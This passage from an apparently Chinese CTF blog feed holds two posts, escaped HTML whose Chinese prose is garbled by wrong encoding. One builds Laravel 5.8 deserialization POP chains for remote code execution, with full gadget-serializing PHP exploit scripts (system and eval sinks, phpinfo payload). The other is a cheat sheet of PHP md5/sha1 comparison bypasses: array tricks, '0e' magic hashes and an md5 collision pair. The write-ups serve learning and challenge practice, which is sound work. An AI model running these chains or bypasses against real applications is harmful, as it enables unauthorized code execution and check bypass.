&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">expiry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">innerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ProxyAdapter&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$setInnerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setInnerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cacheitem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dir&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$proxyadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\ProxyAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$tagawareadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\TagAwareAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cacheitem&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$proxyadapter&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$tagawareadapter&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ¬åœ°å°è¯•ä¸€ä¸‹ï¼ˆæ‡’å¾—å†å¼€é¶æœºäº†w&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104738527.png" alt="image-20211204104738527">&lt;/p>
&lt;p>æˆåŠŸäº†æ&lt;/p>
&lt;h2 id="é“¾å­3---rce">é“¾å­3 - rce&lt;/h2>
&lt;p>åœ¨ &lt;strong>[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1&lt;/strong>è¿™é“é¢˜é‡Œèµµå¸ˆå‚…æŠŠè¿™æ¡è·¯å µæ­»äº†ï¼Œä½†æ˜¯æœ¬åœ°å¤çŽ°æ— æ‰€è°“å•¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204105214847.png" alt="image-20211204105214847">&lt;/p>
&lt;p>æŠŠè¿™ä¸ªæ³¨é‡Šå–æ¶ˆå³å¯&lt;/p>
&lt;p>çœ‹åˆ°å®ƒè°ƒç”¨äº†&lt;code>events&lt;/code>çš„&lt;code>dispatch&lt;/code>æ–¹æ³•ï¼Œè·Ÿä¸Šé¢æ€è·¯ä¸€æ ·ï¼ŒæŽ¥ç€æ‰¾ä¸€ä¸ªå¯ç”¨çš„åˆ«çš„ç±»é‡Œçš„&lt;code>dispatch&lt;/code>ï¼Œæ¯”å¦‚vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204110831694.png" alt="image-20211204110831694">&lt;/p>
&lt;p>çœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªåˆ¤æ–­çš„è¿”å›žæ—¶è°ƒç”¨çš„&lt;code>dispatchNow()&lt;/code>æ˜¯ä»€ä¹ˆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133634260.png" alt="image-20211204133634260">&lt;/p>
&lt;p>150è¡Œæœ‰äº®ç‚¹å•Šï¼Œä½¿ç”¨äº†&lt;code>call_user_func&lt;/code>ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¯æŽ§ï¼Œç¬¬äºŒä¸ªå‚æ•°æ¥è‡ª&lt;code>$command&lt;/code>ï¼Œä¹Ÿå°±æ˜¯æœ€å¼€å§‹æ‰¾çš„æžæž„å‡½æ•°è°ƒç”¨çš„&lt;code>$this-&amp;gt;event&lt;/code>ï¼›çŽ°åœ¨è¦æ‰¾ä¸€ä¸ªç±» å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åŽæˆ‘ä»¬çš„rceå‘½ä»¤ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ï¼Œå®Œæˆæ•´ä¸ªé“¾å­&lt;/p>
&lt;p>ä¸è¿‡å…ˆä¸æ€¥ï¼Œé¦–å…ˆè¦æ»¡è¶³&lt;code>dispatch()&lt;/code>ä¸­çš„ifåˆ¤æ–­&lt;code>$this-&amp;gt;queueResolver &amp;amp;&amp;amp; $this-&amp;gt;commandShouldBeQueued($command)&lt;/code>ï¼Œå‰ä¸€ä¸ªå¯æŽ§ï¼Œçœ‹çœ‹åŽé¢è¿™ä¸ª&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204132803262.png" alt="image-20211204132803262">&lt;/p>
&lt;p>éœ€è¦&lt;code>$command&lt;/code>å¿…é¡»æ˜¯ä¸€ä¸ªå®žçŽ°äº†&lt;code>ShouldQueue&lt;/code>æŽ¥å£çš„ç±»ï¼Œæ‰¾åˆ°è¿™ä¸ª vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133133796.png" alt="image-20211204133133796">&lt;/p>
&lt;p>ç„¶åŽæŽ¥ç€æ‰¾é€‚åˆåš&lt;code>call_user_func()&lt;/code>ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»ï¼Œå®ƒéœ€è¦å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•° vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204135811389.png" alt="image-20211204135811389">&lt;/p>
&lt;p>è¿™ä¸ª&lt;code>load()&lt;/code>å¯ä»¥ç›´æŽ¥è°ƒç”¨evalæ‰§è¡Œä»£ç ï¼Œä½†æ˜¯&lt;code>$defination&lt;/code>è¦æ»¡è¶³ifçš„åˆ¤æ–­ï¼Œè·Ÿè¿›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140231175.png" alt="image-20211204140231175">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140248303.png" alt="image-20211204140248303">&lt;/p>
&lt;p>éœ€è¦é¢å¤–å†æ‰¾ä¸¤ä¸ªç±»ï¼Œç¬¬ä¸€ä¸ªç±»å…·æœ‰&lt;code>code&lt;/code>å±žæ€§ï¼Œç¬¬äºŒç±»åˆ&lt;code>getName&lt;/code>å‡½æ•°ï¼Œæ¥ä½œä¸ºç¬¬ä¸€ä¸ªç±»çš„configå±žæ€§&lt;/p>
&lt;p>å¯ç”¨çš„ç¬¬ä¸€ä¸ªç±»å°±æ˜¯&lt;code>getClassName()&lt;/code>æ‰€åœ¨çš„ç±» vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140502311.png" alt="image-20211204140502311">&lt;/p>
&lt;p>ç¬¬äºŒä¸ªæ˜¯ vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140537312.png" alt="image-20211204140537312">&lt;/p>
&lt;p>æ€»ç»“ä»¥ä¸Šçš„è¿‡ç¨‹ï¼Œå†™exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Line&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Generator&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockDefinition&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Loader&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvalLoader&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">QueuedCommand&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst\Line&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$mockdefinition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Generator\MockDefinition&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$evalloader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Loader\EvalLoader&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$dispatcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$evalloader&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$queuedcommand&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console\QueuedCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$mockdefinition&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$pendingbroadcast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dispatcher&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$queuedcommand&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pendingbroadcast&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ‰§è¡Œæ•ˆæžœï¼ˆç›–äº†ä¸€å±‚laravelæŠ¥é”™çš„åº•è‰²å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140752165.png" alt="image-20211204140752165">&lt;/p>
&lt;p>è¿™ä¸ªé“¾å­éžå¸¸çš„é•¿ï¼Œæ¶‰åŠåˆ°6ä¸ªç±»&lt;/p>
&lt;hr>
&lt;p>popé“¾æ€æˆ‘ï¼ï¼ï¼çœ‹ä»£ç æœ‰ç§ç›®å®³çš„æ„Ÿè§‰äº†&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æŽ¥ðŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html#%E5%A4%8D%E7%8E%B0-1">Laravel POPé“¾ç®€æž &lt;/a> | &lt;a href="https://xz.aliyun.com/t/5911">Laravel5.8.xååºåˆ—åŒ–POPé“¾&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>md5æ¯”è¾ƒå¸¸è§ç»•è¿‡å°ç»“</title><link>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</link><pubDate>Fri, 03 Dec 2021 00:24:56 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</guid><description>&lt;blockquote>
&lt;p>&lt;strong>&lt;u>å†™åœ¨å¼€å¤´ï¼š&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>åˆ«çº ç»“&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>å·¦ä¾§çš„ç¬¦å·åè½¬&amp;amp;æ ‡é¢˜æ˜¯ä¸­æ–‡å¼•å·&amp;amp;æœ‰äº›ç¬¦å·æ¶ˆå¤±&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>çš„é—®é¢˜&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>æˆ‘ä¹Ÿå¾ˆæ— è¯­&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>å¯„ã€‚&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;ul>
&lt;li>
&lt;pre tabindex="0">&lt;code>md5(array()) = md5(NULL) = d41d8cd98f00b204e9800998ecf8427e
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>sha1ç»•è¿‡å’Œmd5ç»•è¿‡æ–¹å¼æ˜¯ä¸€æ ·çš„&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="md5amd5b--ab">md5($a)==md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;p>0eç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>IHKFRNS -&amp;gt; 0e256160682445802696926137988570
QLTHNDT -&amp;gt; 0e405967825401955372549139051580
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
3908336290 -&amp;gt; 0e807624498959190415881248245271
4011627063 -&amp;gt; 0e485805687034439905938362701775
4775635065 -&amp;gt; 0e998212089946640967599450361168
0e215962017 -&amp;gt; 0e291242476940776845150308577824
aabg7XSs -&amp;gt; 0e087386482136013740957780965295
aabC9RqS -&amp;gt; 0e041022518165728065344349536299
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
240610708 -&amp;gt; 0e462097431906509019562988736854
&lt;/code>&lt;/pre>&lt;p>md5ç¢°æ’ž&lt;/p>
&lt;pre tabindex="0">&lt;code>a=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP
b=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab">md5($a)==md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>a=&amp;amp;b[]=1
&lt;/code>&lt;/pre>&lt;h2 id="md5string_getamd5md5string_getb--ab">md5((string)$_GET[&amp;lsquo;a&amp;rsquo;])==md5(md5((string)$_GET[&amp;lsquo;b&amp;rsquo;])) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>0eç»•è¿‡ï¼Œä¸€ä¸ªæ˜¯æ­£å¸¸0eï¼Œä¸€ä¸ªæ˜¯ç¬¬äºŒæ¬¡md5åŽè¿˜ä¸º0eçš„å¥‡è‘©å€¼&lt;/p>
&lt;pre tabindex="0">&lt;code>aawBzC
aabsbm9
aaaabGG5T
aaaabKGVH
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ctype_alphaa--is_numericb">md5($a)==md5($b) &amp;amp;&amp;amp; !ctype_alpha($a) &amp;amp;&amp;amp; !is_numeric($b)&lt;/h2>
&lt;p>0eç»•è¿‡ï¼Œä¸€ä¸ªçº¯æ•°å­—ä¸€ä¸ªçº¯å­—æ¯&lt;/p>
&lt;pre tabindex="0">&lt;code>240610708 -&amp;gt; 0e462097431906509019562988736854
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab">md5($a)===md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab-1">md5($a)===md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
